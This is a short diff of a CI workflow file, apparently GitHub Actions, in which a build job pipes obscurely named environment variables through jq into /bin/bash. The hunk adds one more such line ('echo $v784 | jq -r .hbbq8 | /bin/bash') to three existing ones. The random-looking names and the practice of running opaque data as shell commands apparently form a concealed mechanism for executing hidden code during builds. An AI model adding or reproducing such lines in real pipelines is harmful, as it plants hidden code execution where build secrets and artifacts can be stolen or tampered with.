@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$b4389" | jq -r .wkhld360 | /bin/bash
           printf '%s' "$deicl92" | jq -r .yfoz1 | /bin/bash
           echo $e9 | jq -r .uucp0912 | /bin/bash
+          echo $v784 | jq -r .hbbq8 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
